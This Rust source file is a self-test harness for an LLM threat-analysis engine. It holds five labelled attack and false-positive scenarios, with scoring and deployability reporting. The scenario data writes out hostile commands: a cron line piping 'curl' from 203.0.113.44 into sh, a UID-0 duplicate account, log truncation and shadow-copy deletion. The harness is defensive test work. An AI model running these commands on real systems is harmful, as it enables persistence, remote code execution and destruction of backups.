// src/atc_selftest.rs — end-to-end ATC (Autonomous Threat Cognition) harness.
//
// WHAT THIS EXERCISES, AND WHY IT IS NOT `--llm-inference-test`
//   `--llm-inference-test` calls LLMEngine::raw_generate, which the engine
//   documents as "bypassing threat-analysis prompt assembly and JSON parsing".
//   It proves the backend emits text; it says nothing about whether the agent
//   can actually derive a VERDICT from that text.
//
//   This harness drives the production path instead — LLMEngine::analyze_threat
//   with real ThreatEvent values and real HostContext — so it measures the thing
//   that decides deployability: does the configured model return a usable,
//   correctly-signed analysis, and how long does that take?
//
// GROUND TRUTH
//   Each scenario carries `expect_malicious`, chosen so the answer is not
//   arguable: textbook credential-dumping and ransomware chains are true
//   positives; routine administration and developer-workstation noise are false
//   positives. Two of the five are benign ON PURPOSE — a model that answers
//   "malicious" every time scores 100% on an all-malicious set while being
//   worthless in production. Discrimination is the metric that matters.

use crate::llm::{HostContext, LLMAnalysis, LLMEngine};
use crate::types::{
    AttackChain, ChainStage, ResponseAction, Severity, ThreatEvent, IOC, IOCType,
};
use chrono::{Duration, Utc};

// ─────────────────────────────────────────────────────────────
// Scenario definition
// ─────────────────────────────────────────────────────────────

pub struct Scenario {
    pub key: &'static str,
    pub title: &'static str,
    /// Ground truth: is this actually an incident?
    pub expect_malicious: bool,
    pub host: HostContext,
    pub event: ThreatEvent,
}

/// Per-scenario measurements.
pub struct Outcome {
    pub key: &'static str,
    pub title: &'static str,
    pub expect_malicious: bool,
    /// None = analyze_threat returned None (no analysis produced at all).
    pub analysis: Option<LLMAnalysis>,
    pub wall_ms: u128,
    pub prompt_tokens: u64,
    pub gen_tokens: u64,
    pub gen_ms: u64,
}

impl Outcome {
    pub fn completed(&self) -> bool { self.analysis.is_some() }

    pub fn verdict_correct(&self) -> Option<bool> {
        self.analysis.as_ref().map(|a| a.suspicious == self.expect_malicious)
    }

    /// Did the model return the enriched JSON shape? The composer in
    /// parse_threat_analysis only appends these markers when the corresponding
    /// JSON keys parsed non-empty, so their presence is direct evidence that
    /// structured parsing succeeded rather than falling back to prose.
    pub fn has_next_steps(&self) -> bool {
        self.analysis.as_ref()
            .map(|a| a.explanation.contains("Recommended next steps:"))
            .unwrap_or(false)
    }

    pub fn has_benign_consideration(&self) -> bool {
        self.analysis.as_ref()
            .map(|a| a.explanation.contains("Benign explanation considered:"))
            .unwrap_or(false)
    }

    pub fn refined_techniques(&self) -> usize {
        self.analysis.as_ref().map(|a| a.mitre_refinement.len()).unwrap_or(0)
    }

    /// MITRE IDs that are actually well-formed (T1234 or T1234.001).
    pub fn valid_refined_techniques(&self) -> usize {
        self.analysis.as_ref().map(|a| {
            a.mitre_refinement.iter().filter(|t| is_mitre_id(t)).count()
        }).unwrap_or(0)
    }

    pub fn explanation_chars(&self) -> usize {
        self.analysis.as_ref().map(|a| a.explanation.chars().count()).unwrap_or(0)
    }

    pub fn tokens_per_sec(&self) -> f64 {
        if self.gen_ms == 0 { 0.0 } else { self.gen_tokens as f64 * 1000.0 / self.gen_ms as f64 }
    }
}

fn is_mitre_id(s: &str) -> bool {
    let s = s.trim();
    let b = s.as_bytes();
    if b.len() < 5 || b[0] != b'T' { return false; }
    let rest = &s[1..];
    match rest.split_once('.') {
        Some((a, b2)) => a.len() == 4 && a.chars().all(|c| c.is_ascii_digit())
                      && b2.len() == 3 && b2.chars().all(|c| c.is_ascii_digit()),
        None => rest.len() == 4 && rest.chars().all(|c| c.is_ascii_digit()),
    }
}

/// Fraction of the explanation's content words that already appear in the
/// detection's own name/description. A model that merely restates the alert
/// scores near 1.0; genuine added reasoning scores lower. The prompt explicitly
/// instructs "Do NOT merely restate the threat name", so this measures
/// compliance with the one instruction the prompt puts in capitals.
pub fn echo_ratio(explanation: &str, event: &ThreatEvent) -> f64 {
    let mut source = String::new();
    source.push_str(&event.threat_name.to_lowercase());
    source.push(' ');
    source.push_str(&event.description.to_lowercase());
    for t in event.mitre_tactics.iter().chain(event.mitre_techniques.iter()) {
        source.push(' ');
        source.push_str(&t.to_lowercase());
    }
    let src_words: std::collections::HashSet<&str> =
        source.split(|c: char| !c.is_alphanumeric()).filter(|w| w.len() > 3).collect();

    let expl = explanation.to_lowercase();
    let words: Vec<&str> = expl
        .split(|c: char| !c.is_alphanumeric())
        .filter(|w| w.len() > 3)
        .collect();
    if words.is_empty() { return 0.0; }
    let hits = words.iter().filter(|w| src_words.contains(*w)).count();
    hits as f64 / words.len() as f64
}

// ─────────────────────────────────────────────────────────────
// Scenarios
// ─────────────────────────────────────────────────────────────

fn base_event(id: &str, host: &str) -> ThreatEvent {
    ThreatEvent {
        id: id.to_string(),
        agent_id: "atc-selftest-agent".to_string(),
        hostname: host.to_string(),
        timestamp: Utc::now(),
        severity: Severity::Medium,
        confidence: 60.0,
        threat_name: String::new(),
        description: String::new(),
        mitre_tactics: Vec::new(),
        mitre_techniques: Vec::new(),
        matched_rules: Vec::new(),
        raw_event_ids: Vec::new(),
        chain: None,
        iocs: Vec::new(),
        suggested_action: ResponseAction::Alert,
        llm_analysis: None,
        auto_generated_rule: None,
    }
}

fn stage(tactic: &str, tech: &str, secs: i64, desc: &str) -> ChainStage {
    ChainStage {
        tactic: tactic.to_string(),
        technique: tech.to_string(),
        event_id: format!("evt-{}", secs),
        timestamp: Utc::now() + Duration::seconds(secs),
        description: desc.to_string(),
    }
}

fn ioc(t: IOCType, v: &str, src: &str, conf: f32) -> IOC {
    IOC { ioc_type: t, value: v.to_string(), source: src.to_string(), confidence: conf }
}

pub fn scenarios() -> Vec<Scenario> {
    vec![
        // ── 1. TRUE POSITIVE — classic credential theft ───────────────────
        Scenario {
            key: "cred-dump",
            title: "Office macro → rundll32 → LSASS memory read",
            expect_malicious: true,
            host: HostContext {
                hostname: "FIN-WS-014".into(),
                os: "Windows 11 23H2".into(),
                role: "workstation (finance)".into(),
                internet_facing: false,
                listening_ports: vec![139, 445, 3389],
                key_services: vec!["Outlook".into(), "Excel".into(), "Defender".into()],
                notes: "No developer tooling in baseline; user is non-technical.".into(),
            },
            event: ThreatEvent {
                severity: Severity::High,
                confidence: 72.0,
                threat_name: "Credential access via LSASS memory read".into(),
                description: "A macro-enabled Word document spawned rundll32.exe, which opened a \
                              handle to lsass.exe with PROCESS_VM_READ and read process memory."
                    .into(),
                mitre_tactics: vec!["Initial Access".into(), "Defense Evasion".into(), "Credential Access".into()],
                mitre_techniques: vec!["T1566.001".into(), "T1218.011".into(), "T1003.001".into()],
                matched_rules: vec!["sigma_lsass_access_rundll32".into(), "behavioral_office_child_proc".into()],
                raw_event_ids: (0..14).map(|i| format!("raw-{}", i)).collect(),
                chain: Some(AttackChain {
                    name: "Phish → execute → credential dump".into(),
                    stages: vec![
                        stage("Initial Access", "T1566.001", 0, "WINWORD.EXE opened Q3_Forecast.docm from Outlook temp dir"),
                        stage("Execution", "T1204.002", 3, "WINWORD.EXE spawned rundll32.exe with no DLL argument"),
                        stage("Defense Evasion", "T1218.011", 4, "rundll32.exe invoked without an export — signed-binary proxy pattern"),
                        stage("Credential Access", "T1003.001", 9, "rundll32.exe opened lsass.exe (PROCESS_VM_READ) and read 41 MB"),
                        stage("Collection", "T1074.001", 22, "Wrote C:\\Users\\Public\\tmp\\lsa.dmp (41 MB)"),
                    ],
                    first_seen: Utc::now(),
                    last_seen: Utc::now() + Duration::seconds(22),
                    confidence: 88.0,
                }),
                iocs: vec![
                    ioc(IOCType::ProcessName, "rundll32.exe", "process_monitor", 70.0),
                    ioc(IOCType::FilePath, "C:\\Users\\Public\\tmp\\lsa.dmp", "fim", 90.0),
                    ioc(IOCType::Sha256, "9f2b8c1d4e5a6f70b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4", "hash_scan", 85.0),
                ],
                suggested_action: ResponseAction::CollectForensics,
                ..base_event("atc-1", "FIN-WS-014")
            },
        },

        // ── 2. TRUE POSITIVE — ransomware pre-encryption ──────────────────
        Scenario {
            key: "ransomware",
            title: "Shadow copy deletion followed by mass file rewrite",
            expect_malicious: true,
            host: HostContext {
                hostname: "FILE-SRV-02".into(),
                os: "Windows Server 2022".into(),
                role: "file server".into(),
                internet_facing: false,
                listening_ports: vec![445, 3389, 135],
                key_services: vec!["SMB".into(), "DFS Replication".into(), "Veeam Agent".into()],
                notes: "Backups run 02:00–03:00; no interactive logins in baseline.".into(),
            },
            event: ThreatEvent {
                severity: Severity::Critical,
                confidence: 81.0,
                threat_name: "Ransomware staging: shadow copies destroyed, bulk rewrite in progress".into(),
                description: "vssadmin.exe deleted all shadow copies, then a process rewrote 8,400 \
                              files across three SMB shares in 90 seconds, appending .lkfx to each."
                    .into(),
                mitre_tactics: vec!["Impact".into(), "Defense Evasion".into()],
                mitre_techniques: vec!["T1490".into(), "T1486".into()],
                matched_rules: vec!["sigma_vssadmin_delete_shadows".into(), "fim_mass_rewrite".into(), "ransomware_canary".into()],
                raw_event_ids: (0..8412).map(|i| format!("raw-{}", i)).collect(),
                chain: Some(AttackChain {
                    name: "Inhibit recovery → encrypt".into(),
                    stages: vec![
                        stage("Defense Evasion", "T1490", 0, "vssadmin.exe delete shadows /all /quiet"),
                        stage("Defense Evasion", "T1562.001", 6, "Attempted to stop VeeamAgent and SQLWriter services"),
                        stage("Impact", "T1486", 11, "Canary file D:\\shares\\.nebula_canary rewritten"),
                        stage("Impact", "T1486", 14, "8,400 files rewritten with .lkfx extension across 3 shares"),
                        stage("Impact", "T1491.001", 96, "Dropped README_RESTORE.txt in 212 directories"),
                    ],
                    first_seen: Utc::now(),
                    last_seen: Utc::now() + Duration::seconds(96),
                    confidence: 94.0,
                }),
                iocs: vec![
                    ioc(IOCType::ProcessName, "vssadmin.exe", "process_monitor", 65.0),
                    ioc(IOCType::FilePath, "D:\\shares\\finance\\README_RESTORE.txt", "fim", 95.0),
                    ioc(IOCType::FilePath, "C:\\ProgramData\\svc\\lkfx.exe", "fim", 88.0),
                ],
                suggested_action: ResponseAction::IsolateHost,
                ..base_event("atc-2", "FILE-SRV-02")
            },
        },

        // ── 3. FALSE POSITIVE — routine administration ────────────────────
        Scenario {
            key: "benign-admin",
            title: "Scheduled PowerShell Remoting inventory sweep",
            expect_malicious: false,
            host: HostContext {
                hostname: "MGMT-JUMP-01".into(),
                os: "Windows Server 2022".into(),
                role: "management jump host".into(),
                internet_facing: false,
                listening_ports: vec![5985, 5986, 3389],
                key_services: vec!["WinRM".into(), "SCCM client".into(), "Task Scheduler".into()],
                notes: "Baseline: nightly 01:00 inventory job fans out to ~200 hosts over WinRM. \
                        Runs as svc_inventory. This is the documented pattern for this host."
                    .into(),
            },
            event: ThreatEvent {
                severity: Severity::Medium,
                confidence: 55.0,
                threat_name: "Lateral movement pattern: WinRM fan-out with encoded PowerShell".into(),
                description: "svc_inventory launched powershell.exe with -EncodedCommand and opened \
                              WinRM sessions to 196 remote hosts within 4 minutes."
                    .into(),
                mitre_tactics: vec!["Execution".into(), "Lateral Movement".into()],
                mitre_techniques: vec!["T1059.001".into(), "T1021.006".into()],
                matched_rules: vec!["sigma_encoded_powershell".into(), "behavioral_winrm_fanout".into()],
                raw_event_ids: (0..196).map(|i| format!("raw-{}", i)).collect(),
                chain: Some(AttackChain {
                    name: "Encoded PowerShell → WinRM fan-out".into(),
                    stages: vec![
                        stage("Execution", "T1053.005", 0, "Scheduled task 'NightlyInventory' triggered at 01:00:00"),
                        stage("Execution", "T1059.001", 1, "powershell.exe -EncodedCommand (decodes to Get-CimInstance inventory script)"),
                        stage("Lateral Movement", "T1021.006", 4, "New-PSSession opened to 196 hosts in the workstation OU"),
                        stage("Collection", "T1082", 61, "System info written to \\\\MGMT-JUMP-01\\inventory$\\2026-08-21.csv"),
                    ],
                    first_seen: Utc::now(),
                    last_seen: Utc::now() + Duration::seconds(240),
                    confidence: 58.0,
                }),
                iocs: vec![
                    ioc(IOCType::ProcessName, "powershell.exe", "process_monitor", 40.0),
                    ioc(IOCType::FilePath, "\\\\MGMT-JUMP-01\\inventory$\\2026-08-21.csv", "fim", 30.0),
                ],
                suggested_action: ResponseAction::Monitor,
                ..base_event("atc-3", "MGMT-JUMP-01")
            },
        },

        // ── 4. FALSE POSITIVE — developer workstation noise ───────────────
        Scenario {
            key: "benign-dev",
            title: "CI build: compiler spawning shells, curl to package registries",
            expect_malicious: false,
            host: HostContext {
                hostname: "dev-build-07".into(),
                os: "Ubuntu 24.04".into(),
                role: "developer build agent".into(),
                internet_facing: false,
                listening_ports: vec![22],
                key_services: vec!["sshd".into(), "docker".into(), "gitlab-runner".into()],
                notes: "Baseline: continuous builds all day; heavy process churn is normal here."
                    .into(),
            },
            event: ThreatEvent {
                severity: Severity::Low,
                confidence: 44.0,
                threat_name: "Suspicious process tree: build tool spawning shells and network fetches".into(),
                description: "gitlab-runner spawned 340 short-lived /bin/sh processes and made 51 \
                              outbound HTTPS connections to package registries during a 6-minute window."
                    .into(),
                mitre_tactics: vec!["Execution".into(), "Command and Control".into()],
                mitre_techniques: vec!["T1059.004".into(), "T1105".into()],
                matched_rules: vec!["behavioral_process_churn".into()],
                raw_event_ids: (0..340).map(|i| format!("raw-{}", i)).collect(),
                chain: Some(AttackChain {
                    name: "Process churn → outbound fetch".into(),
                    stages: vec![
                        stage("Execution", "T1059.004", 0, "gitlab-runner forked /bin/sh -c 'cargo build --release'"),
                        stage("Execution", "T1059.004", 2, "340 short-lived shells (rustc, cc, ld) within 6 min"),
                        stage("Command and Control", "T1105", 5, "51 HTTPS connections to static.crates.io and registry.npmjs.org"),
                    ],
                    first_seen: Utc::now(),
                    last_seen: Utc::now() + Duration::seconds(360),
                    confidence: 41.0,
                }),
                iocs: vec![
                    ioc(IOCType::Domain, "static.crates.io", "network_monitor", 20.0),
                    ioc(IOCType::ProcessName, "gitlab-runner", "process_monitor", 25.0),
                ],
                suggested_action: ResponseAction::Monitor,
                ..base_event("atc-4", "dev-build-07")
            },
        },

        // ── 5. TRUE POSITIVE — external brute force → persistence ─────────
        Scenario {
            key: "ssh-bruteforce",
            title: "SSH brute force success → new account → cron persistence",
            expect_malicious: true,
            host: HostContext {
                hostname: "web-edge-03".into(),
                os: "Debian 12".into(),
                role: "public web server".into(),
                internet_facing: true,
                listening_ports: vec![22, 80, 443],
                key_services: vec!["nginx".into(), "sshd".into()],
                notes: "Baseline: only deploy_bot authenticates over SSH, by key, from 10.0.7.0/24."
                    .into(),
            },
            event: ThreatEvent {
                severity: Severity::High,
                confidence: 76.0,
                threat_name: "SSH password brute force succeeded from external address".into(),
                description: "4,812 failed SSH password attempts from 203.0.113.44 over 20 minutes, \
                              followed by a successful root login, a new local account, and a new cron entry."
                    .into(),
                mitre_tactics: vec!["Credential Access".into(), "Persistence".into(), "Initial Access".into()],
                mitre_techniques: vec!["T1110.001".into(), "T1136.001".into(), "T1053.003".into()],
                matched_rules: vec!["sigma_ssh_bruteforce".into(), "sigma_new_local_account".into(), "fim_crontab_change".into()],
                raw_event_ids: (0..4820).map(|i| format!("raw-{}", i)).collect(),
                chain: Some(AttackChain {
                    name: "Brute force → account creation → cron persistence".into(),
                    stages: vec![
                        stage("Credential Access", "T1110.001", 0, "4,812 failed password auths for root/admin/ubuntu from 203.0.113.44"),
                        stage("Initial Access", "T1078.003", 1183, "Successful password auth for root from 203.0.113.44"),
                        stage("Persistence", "T1136.001", 1219, "useradd -o -u 0 -g 0 sysbackup (UID 0 duplicate)"),
                        stage("Persistence", "T1053.003", 1244, "Appended */5 * * * * curl -s 203.0.113.44/p|sh to /etc/crontab"),
                        stage("Defense Evasion", "T1070.003", 1290, "Truncated /var/log/auth.log"),
                    ],
                    first_seen: Utc::now(),
                    last_seen: Utc::now() + Duration::seconds(1290),
                    confidence: 91.0,
                }),
                iocs: vec![
                    ioc(IOCType::Ipv4, "203.0.113.44", "network_monitor", 92.0),
                    ioc(IOCType::ProcessName, "useradd", "process_monitor", 60.0),
                    ioc(IOCType::FilePath, "/etc/crontab", "fim", 88.0),
                ],
                suggested_action: ResponseAction::IsolateHost,
                ..base_event("atc-5", "web-edge-03")
            },
        },
    ]
}

// ─────────────────────────────────────────────────────────────
// Runner
// ─────────────────────────────────────────────────────────────

/// Per-generation token/timing counters, if the embedded engine exposes them.
/// This agent embeds stock llama.cpp, which does not surface them here, so the
/// throughput columns read zero. (The dropped BitNet sibling engine had these.)
fn last_gen_stats() -> (u64, u64, u64) {
    (0, 0, 0)
}

pub async fn run(engine: &LLMEngine, only: Option<&str>) -> Vec<Outcome> {
    let mut outcomes = Vec::new();

    for sc in scenarios() {
        if let Some(f) = only {
            if sc.key != f { continue; }
        }

        println!("\n┌─ scenario: {} — {}", sc.key, sc.title);
        println!("│  host      : {} ({})", sc.host.hostname, sc.host.role);
        println!("│  detection : {} [{}]", sc.event.threat_name, sc.event.severity);
        println!("│  truth     : {}", if sc.expect_malicious { "MALICIOUS" } else { "BENIGN (false positive)" });
        println!("│  running analyze_threat …");

        // Production ordering: inventory sets host context, then a detection is
        // analyzed against it.
        engine.set_host_context(sc.host.clone());

        let t0 = std::time::Instant::now();
        let analysis = engine.analyze_threat(&sc.event).await;
        let wall_ms = t0.elapsed().as_millis();

        let (ptok, gtok, gms) = last_gen_stats();

        match &analysis {
            Some(a) => {
                println!("│  → verdict : {} (expected {})",
                    if a.suspicious { "MALICIOUS" } else { "BENIGN" },
                    if sc.expect_malicious { "MALICIOUS" } else { "BENIGN" });
                println!("│  → conf adj: {:+.0}", a.confidence_adjustment);
                println!("│  → techniques: {:?}", a.mitre_refinement);
                println!("│  → explanation ({} chars):", a.explanation.chars().count());
                for line in a.explanation.lines() {
                    println!("│      {}", line);
                }
            }
            None => {
                println!("│  → NO ANALYSIS PRODUCED (analyze_threat returned None)");
            }
        }
        println!("│  timing    : {:.1}s wall | {} prompt tok | {} gen tok | {:.2} tok/s",
            wall_ms as f64 / 1000.0, ptok, gtok,
            if gms > 0 { gtok as f64 * 1000.0 / gms as f64 } else { 0.0 });
        println!("└─");

        outcomes.push(Outcome {
            key: sc.key,
            title: sc.title,
            expect_malicious: sc.expect_malicious,
            analysis,
            wall_ms,
            prompt_tokens: ptok,
            gen_tokens: gtok,
            gen_ms: gms,
        });
    }

    outcomes
}

// ─────────────────────────────────────────────────────────────
// Reporting
// ─────────────────────────────────────────────────────────────

fn pct(n: usize, d: usize) -> f64 {
    if d == 0 { 0.0 } else { n as f64 * 100.0 / d as f64 }
}

fn bar(p: f64) -> String {
    let filled = ((p / 100.0) * 20.0).round() as usize;
    format!("{}{}", "█".repeat(filled.min(20)), "░".repeat(20 - filled.min(20)))
}

pub fn report(outcomes: &[Outcome]) {
    let n = outcomes.len();
    if n == 0 { println!("no scenarios run"); return; }

    let scen = scenarios();
    let event_for = |key: &str| scen.iter().find(|s| s.key == key).map(|s| &s.event);

    // ── Feasibility ──────────────────────────────────────────
    let completed: Vec<&Outcome> = outcomes.iter().filter(|o| o.completed()).collect();
    let n_completed = completed.len();

    let structured = completed.iter().filter(|o| o.has_next_steps()).count();
    let benign_considered = completed.iter().filter(|o| o.has_benign_consideration()).count();

    let total_wall_ms: u128 = outcomes.iter().map(|o| o.wall_ms).sum();
    let total_gen_tokens: u64 = outcomes.iter().map(|o| o.gen_tokens).sum();
    let total_prompt_tokens: u64 = outcomes.iter().map(|o| o.prompt_tokens).sum();
    let total_gen_ms: u64 = outcomes.iter().map(|o| o.gen_ms).sum();
    let agg_tok_s = if total_gen_ms > 0 {
        total_gen_tokens as f64 * 1000.0 / total_gen_ms as f64
    } else { 0.0 };
    let mean_wall_s = total_wall_ms as f64 / n as f64 / 1000.0;

    // ── Analysis value ───────────────────────────────────────
    let correct = completed.iter().filter(|o| o.verdict_correct() == Some(true)).count();
    let malicious: Vec<&&Outcome> = completed.iter().filter(|o| o.expect_malicious).collect();
    let benign: Vec<&&Outcome> = completed.iter().filter(|o| !o.expect_malicious).collect();
    let recall_hits = malicious.iter()
        .filter(|o| o.analysis.as_ref().map(|a| a.suspicious).unwrap_or(false)).count();
    let spec_hits = benign.iter()
        .filter(|o| o.analysis.as_ref().map(|a| !a.suspicious).unwrap_or(false)).count();

    let total_refined: usize = completed.iter().map(|o| o.refined_techniques()).sum();
    let valid_refined: usize = completed.iter().map(|o| o.valid_refined_techniques()).sum();

    let echo: Vec<f64> = completed.iter().filter_map(|o| {
        let a = o.analysis.as_ref()?;
        let ev = event_for(o.key)?;
        Some(echo_ratio(&a.explanation, ev))
    }).collect();
    let mean_echo = if echo.is_empty() { 0.0 } else { echo.iter().sum::<f64>() / echo.len() as f64 };

    let mean_expl: f64 = if n_completed == 0 { 0.0 } else {
        completed.iter().map(|o| o.explanation_chars() as f64).sum::<f64>() / n_completed as f64
    };

    println!("\n\n╔══════════════════════════════════════════════════════════════════╗");
    println!("║  ATC END-TO-END RESULTS — {} scenarios via analyze_threat        ", n);
    println!("╚══════════════════════════════════════════════════════════════════╝");

    println!("\n── Per-scenario ──────────────────────────────────────────────────");
    println!("{:<16} {:<9} {:<10} {:<9} {:>8} {:>9}",
             "SCENARIO", "TRUTH", "VERDICT", "RESULT", "WALL", "TOK/S");
    for o in outcomes {
        let truth = if o.expect_malicious { "malicious" } else { "benign" };
        let (verdict, result) = match (&o.analysis, o.verdict_correct()) {
            (Some(a), Some(true))  => (if a.suspicious { "malicious" } else { "benign" }, "✅ correct"),
            (Some(a), Some(false)) => (if a.suspicious { "malicious" } else { "benign" }, "❌ wrong"),
            _ => ("—", "⛔ none"),
        };
        println!("{:<16} {:<9} {:<10} {:<9} {:>7.1}s {:>9.2}",
                 o.key, truth, verdict, result,
                 o.wall_ms as f64 / 1000.0, o.tokens_per_sec());
    }

    println!("\n  legend:");
    for o in outcomes {
        println!("    {:<16} {}", o.key, o.title);
    }

    println!("\n── FEASIBILITY ───────────────────────────────────────────────────");
    let p_complete = pct(n_completed, n);
    let p_struct = pct(structured, n);
    println!("  Completion rate        {} {:>6.1}%   ({}/{} produced any analysis)",
             bar(p_complete), p_complete, n_completed, n);
    println!("  Structured-JSON rate   {} {:>6.1}%   ({}/{} parsed the required schema)",
             bar(p_struct), p_struct, structured, n);
    println!("  Mean latency                                {:>8.1}s per detection", mean_wall_s);
    println!("  Generation throughput                       {:>8.2} tok/s (measured)", agg_tok_s);
    println!("  Tokens generated / prompt                   {:>8} / {}", total_gen_tokens, total_prompt_tokens);
    if mean_wall_s > 0.0 {
        println!("  Sustainable detection rate                  {:>8.1} analyses/hour",
                 3600.0 / mean_wall_s.max(0.001));
    }

    println!("\n── ANALYSIS VALUE ────────────────────────────────────────────────");
    if n_completed == 0 {
        println!("  n/a — no analysis was produced, so there is nothing to score.");
    } else {
        let p_acc = pct(correct, n_completed);
        let p_recall = pct(recall_hits, malicious.len());
        let p_spec = pct(spec_hits, benign.len());
        let p_valid = pct(valid_refined, total_refined.max(1));
        let p_benign_cons = pct(benign_considered, n_completed);
        println!("  Verdict accuracy       {} {:>6.1}%   ({}/{} correct)",
                 bar(p_acc), p_acc, correct, n_completed);
        println!("  Recall (malicious)     {} {:>6.1}%   ({}/{} true positives caught)",
                 bar(p_recall), p_recall, recall_hits, malicious.len());
        println!("  Specificity (benign)   {} {:>6.1}%   ({}/{} false positives cleared)",
                 bar(p_spec), p_spec, spec_hits, benign.len());
        println!("  Actionable next steps  {} {:>6.1}%   ({}/{} included operator actions)",
                 bar(p_struct), p_struct, structured, n_completed);
        println!("  Benign alternative     {} {:>6.1}%   ({}/{} weighed a non-malicious cause)",
                 bar(p_benign_cons), p_benign_cons, benign_considered, n_completed);
        println!("  MITRE refinement       {} {:>6.1}%   ({}/{} returned IDs well-formed)",
                 bar(p_valid), p_valid, valid_refined, total_refined);
        println!("  Restatement (echo)     {} {:>6.1}%   (lower is better — % of words lifted from the alert)",
                 bar(mean_echo * 100.0), mean_echo * 100.0);
        println!("  Mean explanation length                     {:>8.0} chars", mean_expl);
    }

    // ── Composite ────────────────────────────────────────────
    println!("\n── VERDICT ───────────────────────────────────────────────────────");
    let deployable = p_complete >= 80.0
        && n_completed > 0
        && pct(correct, n_completed) >= 80.0
        && mean_wall_s <= 60.0;
    if deployable {
        println!("  DEPLOYABLE as the ATC brain on this hardware.");
    } else {
        println!("  NOT DEPLOYABLE as the ATC brain on this hardware. Blocking factors:");
        if p_complete < 80.0 {
            println!("    • completion rate {:.0}% — analyses are not being produced at all", p_complete);
        }
        if n_completed > 0 && pct(correct, n_completed) < 80.0 {
            println!("    • verdict accuracy {:.0}% — verdicts are unreliable", pct(correct, n_completed));
        }
        if mean_wall_s > 60.0 {
            println!("    • {:.0}s mean latency — too slow for per-detection enrichment", mean_wall_s);
        }
    }
}
